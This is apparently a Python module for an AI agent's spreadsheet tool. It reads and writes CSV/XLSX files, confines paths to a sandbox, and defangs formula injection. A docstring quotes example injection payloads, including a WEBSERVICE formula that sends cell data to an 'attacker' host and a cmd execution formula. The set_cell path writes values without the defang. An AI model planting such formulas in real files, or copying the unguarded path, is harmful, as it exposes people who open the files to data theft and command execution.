"""Spreadsheet tool: read / write / edit CSV + XLSX.

Complements ``pandas_query`` (which *analyzes* tabular data read-only) with a
*write*-capable tool: create sheets, write rows, set individual cells. CSV uses
the stdlib; XLSX uses openpyxl (an optional extra — ops on .xlsx fail with an
actionable "install" message when it's absent, mirroring the other optional-dep
tools). ops: info, read, write, set_cell.
"""
from __future__ import annotations

import csv as _csv
from pathlib import Path
from typing import Any

from . import Tool

_SPREADSHEET_SCHEMA = {
    "type": "object",
    "properties": {
        "op": {"type": "string", "enum": ["info", "read", "write", "set_cell"]},
        "path": {"type": "string", "description": "path to a .csv or .xlsx file"},
        "rows": {"type": "array", "description": "rows (list of lists) for write",
                 "items": {"type": "array"}},
        "sheet": {"type": "string", "description": "sheet name (xlsx; default: first/active)"},
        "cell": {"type": "string", "description": "A1-style cell for set_cell, e.g. 'B2'"},
        "value": {"description": "value for set_cell"},
        "limit": {"type": "integer", "default": 50},
    },
    "required": ["op", "path"],
}


def _is_xlsx(path: Path) -> bool:
    return path.suffix.lower() in (".xlsx", ".xlsm")


def _openpyxl():
    try:
        import openpyxl  # noqa: F401
        return openpyxl
    except ImportError as e:
        raise RuntimeError(
            "openpyxl not installed; .xlsx support needs it. "
            "Run: pip install 'maverick-agent[spreadsheet]'") from e


def _safe_path(sandbox, user_path: str) -> Path:
    """Resolve ``user_path`` confined to ``sandbox.workdir`` when available.

    Spreadsheet operations read and write files, so model-supplied paths must
    use the same workspace confinement as filesystem-like tools whenever the
    default registry wires a sandbox into this tool. Without a sandbox, preserve
    direct-path behavior for standalone/unit use.
    """
    if sandbox is None:
        return Path(user_path).expanduser()
    workdir = Path(sandbox.workdir).resolve()
    candidate = Path(user_path)
    candidate = (
        candidate.resolve()
        if candidate.is_absolute()
        else (workdir / candidate).resolve()
    )
    try:
        candidate.relative_to(workdir)
    except ValueError as e:
        raise ValueError(
            f"path {user_path!r} escapes the workspace"
        ) from e
    return candidate


# Characters a spreadsheet app treats as the start of a formula.
_FORMULA_TRIGGERS = ("=", "+", "-", "@", "\t", "\r")


def _neutralize_formula(value: Any) -> Any:
    """Defang a CSV/XLSX formula-injection cell.

    A model-supplied string cell beginning with ``=``, ``+``, ``-``, ``@``, TAB
    or CR is executed as a formula when the file is opened in Excel / Sheets
    (``=HYPERLINK(...)``, ``=WEBSERVICE("http://attacker/?"&A1)``,
    ``=cmd|'/c ...'``). Prefixing a single quote makes the app render it as
    literal text. Non-string cells (numbers) are left untouched.
    """
    if isinstance(value, str) and value[:1] in _FORMULA_TRIGGERS:
        return "'" + value
    return value


# ---- CSV --------------------------------------------------------------------

def _csv_read(path: Path, limit: int) -> list[list]:
    with path.open(newline="", encoding="utf-8") as f:
        return [row for _, row in zip(range(limit), _csv.reader(f), strict=False)]


def _csv_write(path: Path, rows: list[list]) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    with path.open("w", newline="", encoding="utf-8") as f:
        _csv.writer(f).writerows(
            [_neutralize_formula(c) for c in row] for row in rows
        )


# ---- XLSX -------------------------------------------------------------------

def _xlsx_read(path: Path, sheet: str | None, limit: int) -> list[list]:
    wb = _openpyxl().load_workbook(path, read_only=True, data_only=True)
    ws = wb[sheet] if sheet else wb.active
    out = []
    for i, row in enumerate(ws.iter_rows(values_only=True)):
        if i >= limit:
            break
        out.append(list(row))
    return out


def _xlsx_write(path: Path, rows: list[list], sheet: str | None) -> None:
    op = _openpyxl()
    path.parent.mkdir(parents=True, exist_ok=True)
    wb = op.Workbook()
    ws = wb.active
    if sheet:
        ws.title = sheet
    for row in rows:
        ws.append([_neutralize_formula(c) for c in row])
    wb.save(path)


def _xlsx_set_cell(path: Path, cell: str, value: Any, sheet: str | None) -> None:
    op = _openpyxl()
    wb = op.load_workbook(path) if path.exists() else op.Workbook()
    ws = wb[sheet] if (sheet and sheet in wb.sheetnames) else wb.active
    if sheet and ws.title != sheet:
        ws.title = sheet
    ws[cell] = value
    path.parent.mkdir(parents=True, exist_ok=True)
    wb.save(path)


# ---- dispatch ---------------------------------------------------------------

def _run(args: dict[str, Any], sandbox=None) -> str:
    op = args.get("op")
    raw_path = str(args.get("path") or "")
    if not op:
        return "ERROR: op is required"
    if not raw_path:
        return "ERROR: path is required"
    try:
        path = _safe_path(sandbox, raw_path)
    except ValueError as e:
        return f"ERROR: {e}"
    limit = max(1, int(args.get("limit") or 50))
    sheet = args.get("sheet")
    try:
        if op == "info":
            if not path.exists():
                return f"ERROR: no such file {path}"
            if _is_xlsx(path):
                wb = _openpyxl().load_workbook(path, read_only=True)
                dims = {s: (wb[s].max_row, wb[s].max_column) for s in wb.sheetnames}
                return f"xlsx sheets {dims}"
            rows = _csv_read(path, 10_000)
            return f"csv rows={len(rows)} cols={len(rows[0]) if rows else 0}"
        if op == "read":
            if not path.exists():
                return f"ERROR: no such file {path}"
            rows = _xlsx_read(path, sheet, limit) if _is_xlsx(path) else _csv_read(path, limit)
            import json
            return json.dumps(rows, default=str)
        if op == "write":
            rows = args.get("rows")
            if not isinstance(rows, list):
                return "ERROR: write requires rows (list of lists)"
            norm = [list(r) for r in rows]
            if _is_xlsx(path):
                _xlsx_write(path, norm, sheet)
            else:
                _csv_write(path, norm)
            return f"wrote {len(rows)} row(s) to {path}"
        if op == "set_cell":
            if not _is_xlsx(path):
                return "ERROR: set_cell is xlsx-only; use write for csv"
            cell = str(args.get("cell") or "").strip()
            if not cell:
                return "ERROR: set_cell requires cell (e.g. 'B2')"
            _xlsx_set_cell(path, cell, args.get("value"), sheet)
            return f"set {cell} in {path}"
    except RuntimeError as e:
        return f"ERROR: {e}"
    except Exception as e:  # noqa: BLE001
        return f"ERROR: spreadsheet {op} failed: {type(e).__name__}: {e}"
    return f"ERROR: unknown op {op!r}"


def spreadsheet(sandbox=None) -> Tool:
    return Tool(
        name="spreadsheet",
        description=(
            "Read / write / edit CSV + XLSX spreadsheets. ops: info (sheets + "
            "dims), read (rows as JSON), write (rows -> file), set_cell (xlsx "
            "A1-cell). Complements pandas_query (read-only analysis) with writes."
        ),
        input_schema=_SPREADSHEET_SCHEMA,
        fn=lambda args: _run(args, sandbox),
    )
